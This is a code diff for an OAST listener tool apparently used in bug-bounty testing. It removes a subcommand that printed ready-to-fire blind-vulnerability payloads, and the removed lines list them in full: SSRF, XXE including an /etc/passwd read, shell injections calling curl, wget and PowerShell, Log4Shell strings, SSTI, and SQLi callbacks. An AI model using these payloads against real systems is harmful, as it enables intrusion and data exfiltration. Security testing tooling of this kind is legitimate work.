@@ -29,12 +29,10 @@ Subcommands:
   stop     Terminate listener (SIGTERM then SIGKILL after 3s).
   cleanup  Stop every repository-recorded listener (used at session end).
   status   List all known OAST instances and their liveness.
-  payloads Print blind-class payloads with the active OAST URL substituted.
 
 Usage examples:
   python3 tools/oast_listen.py start    --target shop.com
   python3 tools/oast_listen.py --start --provider interactsh  # legacy alias; uses target=default
-  python3 tools/oast_listen.py payloads --target shop.com --vuln-class XXE
   python3 tools/oast_listen.py poll     --target shop.com
   python3 tools/oast_listen.py stop     --target shop.com
   python3 tools/oast_listen.py status
@@ -88,125 +86,6 @@ FINDINGS_ROOT = REPO_ROOT / "findings"
 INTERACTSH_BIN = "interactsh-client"
 WEBHOOK_SITE_API = "https://webhook.site/token"
 PID_GRACE_SECS = 3
-
-# ─── OAST payload templates ─────────────────────────────────────────────────
-# Curated, ready-to-fire payloads for blind-class confirmation.
-#
-# Substitution token: literal `OAST_URL` — replaced verbatim with the contents
-# of findings/<target>/oast/url.txt at payload generation time. Templates are
-# designed assuming OAST_URL resolves to a bare hostname (e.g. abc.oast.fun)
-# which is what `interactsh-client` emits; webhook.site URLs (with scheme)
-# also work but produce slightly redundant `https://https://...` strings —
-# operator can hand-edit if the target rejects them.
-#
-# Curation rule: 5-15 payloads per class, biased toward shapes that hit on
-# real bug-bounty disclosures (HackerOne/Intigriti). One-row edits add new
-# payloads or classes.
-OAST_PAYLOAD_TEMPLATES: dict[str, list[str]] = {
-    "SSRF": [
-        # --- Bare URL replacements (fits ?url=, ?image_url=, JSON {"url":...}) ---
-        "http://OAST_URL/ssrf-http",
-        "https://OAST_URL/ssrf-https",
-        "//OAST_URL/ssrf-protocol-relative",
-        # --- Userinfo / fragment confusion (Ruby/Node URL parser splits) ---
-        "http://OAST_URL@127.0.0.1/ssrf-userinfo",
-        "http://127.0.0.1@OAST_URL/ssrf-attacker-as-pass",
-        "http://OAST_URL#@127.0.0.1/ssrf-fragment",
-        # --- Non-HTTP schemes (gopher = SSRF→Redis/SMTP, dict = memcached) ---
-        "gopher://OAST_URL:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20OAST_URL%0d%0a%0d%0a",
-        "dict://OAST_URL:11211/stat",
-        # --- JSON / XML body shapes ---
-        '{"url":"http://OAST_URL/ssrf-json-url"}',
-        '{"image_url":"http://OAST_URL/ssrf-image-url","callback_url":"http://OAST_URL/cb"}',
-        # --- SVG href / image fetcher (PDF generators, image processors) ---
-        '<svg xmlns="http://www.w3.org/2000/svg"><image href="http://OAST_URL/ssrf-svg"/></svg>',
-        # --- OAuth/SAML redirect_uri lane ---
-        "http://OAST_URL/oauth-cb",
-    ],
-    "XXE": [
-        # --- Classic general entity (works on permissive parsers) ---
-        '<?xml version="1.0"?>\n'
-        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OAST_URL/xxe-general">]>\n'
-        '<foo>&xxe;</foo>',
-        # --- Parameter entity (bypasses some general-entity blocklists) ---
-        '<?xml version="1.0"?>\n'
-        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://OAST_URL/xxe-param">%xxe;]>\n'
-        '<foo>1</foo>',
-        # --- OOB file exfil via external DTD (requires hosting exfil.dtd) ---
-        '<?xml version="1.0"?>\n'
-        '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://OAST_URL/exfil.dtd">%dtd;]>\n'
-        '<foo>1</foo>',
-        # --- XInclude (works when DOCTYPE is stripped but XInclude is on) ---
-        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
-        '<xi:include href="http://OAST_URL/xinclude" parse="text"/></foo>',
-        # --- SVG XXE (file upload / image processor lane) ---
-        '<?xml version="1.0"?>\n'
-        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://OAST_URL/svg-xxe">]>\n'
-        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
-        '<text>&xxe;</text></svg>',
-        # --- SOAP envelope XXE ---
-        '<?xml version="1.0" encoding="utf-8"?>\n'
-        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://OAST_URL/soap-xxe">]>\n'
-        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
-        '<soap:Body>&xxe;</soap:Body></soap:Envelope>',
-        # --- PHP-filter base64 file read chained with OOB DTD ---
-        '<?xml version="1.0"?>\n'
-        '<!DOCTYPE foo [\n'
-        '  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">\n'
-        '  <!ENTITY % dtd SYSTEM "http://OAST_URL/php-filter.dtd">\n'
-        '  %dtd;\n'
-        ']>\n<foo>1</foo>',
-    ],
-    "RCE": [
-        # --- Shell metacharacters (host header / param injection lane) ---
-        "; curl http://OAST_URL/rce-semi",
-        "| curl http://OAST_URL/rce-pipe",
-        "& curl http://OAST_URL/rce-amp",
-        "&& curl http://OAST_URL/rce-and",
-        "$(curl http://OAST_URL/rce-dollar)",
-        "`curl http://OAST_URL/rce-backtick`",
-        # --- Exfil-via-tool variants (curl blocked? try wget) ---
-        ";wget -q http://OAST_URL/rce-wget -O /dev/null",
-        # --- Windows / PowerShell ---
-        '; powershell -c "(New-Object Net.WebClient).DownloadString(\'http://OAST_URL/rce-pwsh\')"',
-        # --- Log4Shell + obfuscation bypass (Java JNDI lookup lane) ---
-        "${jndi:ldap://OAST_URL/log4shell}",
-        "${${lower:j}ndi:${lower:l}dap://OAST_URL/log4shell-obf}",
-        # --- Spring4Shell SpEL ---
-        '${T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","http://OAST_URL/spring4shell"})}',
-        # --- SSTI: Jinja2 / Twig / Freemarker ---
-        "{{ ''.__class__.__mro__[1].__subclasses__()[40]"
-        "('/etc/passwd').read() }}|curl http://OAST_URL/jinja",
-        "{{ _self.env.registerUndefinedFilterCallback('exec') }}"
-        "{{ _self.env.getFilter('curl http://OAST_URL/twig') }}",
-        '<#assign ex="freemarker.template.utility.Execute"?new()>'
-        '${ex("curl http://OAST_URL/freemarker")}',
-    ],
-    "SQLi": [
-        # --- MSSQL: xp_dirtree triggers SMB → DNS lookup ---
-        "'; EXEC master..xp_dirtree '\\\\OAST_URL\\share'-- -",
-        # --- MSSQL: alternative xp_fileexist ---
-        "'; EXEC master..xp_fileexist '\\\\OAST_URL\\test'-- -",
-        # --- PostgreSQL: COPY ... TO PROGRAM (OOB via shell) ---
-        "'; COPY (SELECT '') TO PROGRAM 'curl http://OAST_URL/pg-copy'-- -",
-        # --- PostgreSQL: dblink_connect callback ---
-        "'; SELECT dblink_connect('host=OAST_URL "
-        "user=u password=p dbname=postgres')-- -",
-        # --- MySQL: LOAD_FILE UNC path (Windows MySQL with FILE priv) ---
-        "' UNION SELECT LOAD_FILE("
-        "CONCAT('\\\\\\\\',version(),'.OAST_URL\\\\test'))-- -",
-        # --- Oracle: UTL_HTTP.REQUEST OOB ---
-        "' UNION SELECT UTL_HTTP.REQUEST("
-        "'http://OAST_URL/oracle-utlhttp') FROM DUAL-- -",
-        # --- Oracle: DBMS_LDAP.INIT (alternative when UTL_HTTP is locked) ---
-        "' UNION SELECT DBMS_LDAP.INIT("
-        "'OAST_URL', 80) FROM DUAL-- -",
-        # --- Oracle: HTTPURITYPE / XMLType ---
-        "' UNION SELECT HTTPURITYPE("
-        "'http://OAST_URL/oracle-httpuri').GETCLOB() FROM DUAL-- -",
-    ],
-}
-
 
 def _target_dir(target: str) -> Path:
     safe = target.replace("/", "_").strip()
@@ -512,8 +391,8 @@ def _emit_start_hint(target: str, state: str, url: str, backend: str, *, pid: in
         f"backend: {backend}\n"
         f"oast_url: {url}\n"
         f"pid: {pid}\n"
-        "next_priority_action: include the URL in SSRF/XXE/RCE payloads, then run "
-        "tools/oast_listen.py poll periodically to drain callbacks\n"
+        "next_priority_action: let AI choose a target-specific test input using the "
+        "URL, then run tools/oast_listen.py poll periodically to drain callbacks\n"
     )
 
 
@@ -601,9 +480,9 @@ def _poll_webhook_site(target: str, paths: dict[str, Path], since_ts: int) -> in
 
 def _emit_poll_hint(target: str, *, drained: int) -> None:
     next_action = (
-        "no new callbacks — keep payloads in flight, poll again later"
+        "no new callbacks — keep the selected test input in flight, poll again later"
         if drained == 0
-        else "review drained callbacks; correlate source_ip/path with sent payloads"
+        else "review drained callbacks; correlate source_ip/path with the selected input"
     )
     sys.stdout.write(
         "\n## CLAUDE_HINT\n"
@@ -721,82 +600,6 @@ def cmd_cleanup() -> int:
     return 1 if failures else 0
 
 
-def _resolve_vuln_class(name: str) -> Optional[str]:
-    """Map user input to a canonical OAST_PAYLOAD_TEMPLATES key.
-
-    Case-insensitive; returns None when the name doesn't match any class.
-    Returning None lets the caller emit a clear error with the supported set
-    instead of leaking a KeyError.
-    """
-    if not name:
-        return None
-    lower_to_canonical = {k.lower(): k for k in OAST_PAYLOAD_TEMPLATES}
-    return lower_to_canonical.get(name.strip().lower())
-
-
-def cmd_payloads(target: str, vuln_class: str) -> int:
-    """Substitute the active OAST URL into curated blind-class payloads.
-
-    Reads findings/<target>/oast/url.txt (canonical location written by `start`)
-    and prints ready-to-fire payloads to stdout. Also writes them to
-    findings/<target>/oast/payloads_<class>.txt for replay/audit.
-
-    Errors clearly when no listener was ever started for the target — operator
-    must run `start --target <target>` first.
-    """
-    paths = _paths(target)
-    url_path = paths["url"]
-    if not url_path.is_file():
-        _log_err(
-            f"no OAST URL recorded for {target}. "
-            f"Run `python3 tools/oast_listen.py start --target {target}` first."
-        )
-        return 2
-    raw = url_path.read_text(encoding="utf-8").strip()
-    if not raw:
-        _log_err(
-            f"OAST URL file is empty for {target} ({url_path}). "
-            "Listener may have failed to register. Re-run `start`."
-        )
-        return 2
-    canonical = _resolve_vuln_class(vuln_class)
-    if canonical is None:
-        supported = ", ".join(sorted(OAST_PAYLOAD_TEMPLATES.keys()))
-        _log_err(
-            f"unknown vuln-class '{vuln_class}'. Supported: {supported}"
-        )
-        return 2
-    templates = OAST_PAYLOAD_TEMPLATES[canonical]
-    substituted = [t.replace("OAST_URL", raw) for t in templates]
-    # Persist for replay
-    paths["base"].mkdir(parents=True, exist_ok=True)
-    out_file = paths["base"] / f"payloads_{canonical}.txt"
-    out_file.write_text("\n".join(substituted) + "\n", encoding="utf-8")
-    # Print to stdout — the operator copy/pastes from here straight into Burp
-    for payload in substituted:
-        sys.stdout.write(payload + "\n")
-        sys.stdout.write("---\n")
-    _emit_payloads_hint(target, canonical, len(substituted), out_file, raw)
-    return 0
-
-
-def _emit_payloads_hint(
-    target: str, vuln_class: str, count: int, out_file: Path, oast_url: str
-) -> None:
-    sys.stdout.write(
-        "\n## CLAUDE_HINT\n"
-        "phase: oast_payloads\n"
-        f"target: {target}\n"
-        f"vuln_class: {vuln_class}\n"
-        f"oast_url: {oast_url}\n"
-        f"payload_count: {count}\n"
-        f"saved_to: {out_file}\n"
-        "next_priority_action: fire payloads at suspected blind-class endpoints, "
-        "then run `python3 tools/oast_listen.py poll --target "
-        f"{target}` to drain callbacks\n"
-    )
-
-
 # ─── Callback normalization ─────────────────────────────────────────────────
 def _normalize_callback(record: dict) -> dict:
     """Produce a stable schema across interactsh and webhook.site sources."""
@@ -857,17 +660,6 @@ def build_parser() -> argparse.ArgumentParser:
     sub.add_parser("cleanup", help="Stop all repository-recorded listeners.")
     sub.add_parser("status", help="List all known OAST instances and liveness.")
 
-    p_payloads = sub.add_parser(
-        "payloads",
-        help="Print blind-class payloads with the active OAST URL substituted.",
-    )
-    p_payloads.add_argument("--target", required=True)
-    p_payloads.add_argument(
-        "--vuln-class",
-        required=True,
-        choices=sorted(OAST_PAYLOAD_TEMPLATES.keys()),
-        help="Blind vulnerability class to generate payloads for.",
-    )
     return p
 
 
@@ -878,7 +670,7 @@ def _normalize_legacy_argv(argv: list[str]) -> list[str]:
     偶尔会生成旧式 flag，argparse 会把 provider 值误当成 subcommand。
     这里只做薄兼容，不改变标准子命令路径：
 
-    - `--start` / `--poll` / `--stop` / `--status` / `--payloads` 映射到子命令；
+    - `--start` / `--poll` / `--stop` / `--status` 映射到子命令；
     - `--provider interactsh` 对本工具没有额外含义，丢弃；
     - `--provider webhook|webhook.site|webhook-site` 映射为 `--allow-external`；
     - legacy `--start` 缺少 target 时使用 `default`，保证“只想拿 OAST URL”
@@ -889,7 +681,6 @@ def _normalize_legacy_argv(argv: list[str]) -> list[str]:
         "--poll": "poll",
         "--stop": "stop",
         "--status": "status",
-        "--payloads": "payloads",
     }
     matched = next((flag for flag in legacy_to_cmd if flag in argv), None)
     if matched is None:
@@ -935,8 +726,6 @@ def main(argv: list[str] | None = None) -> int:
         return cmd_cleanup()
     if args.cmd == "status":
         return cmd_status()
-    if args.cmd == "payloads":
-        return cmd_payloads(args.target, args.vuln_class)
     parser.error(f"unknown command {args.cmd}")
     return 2
 
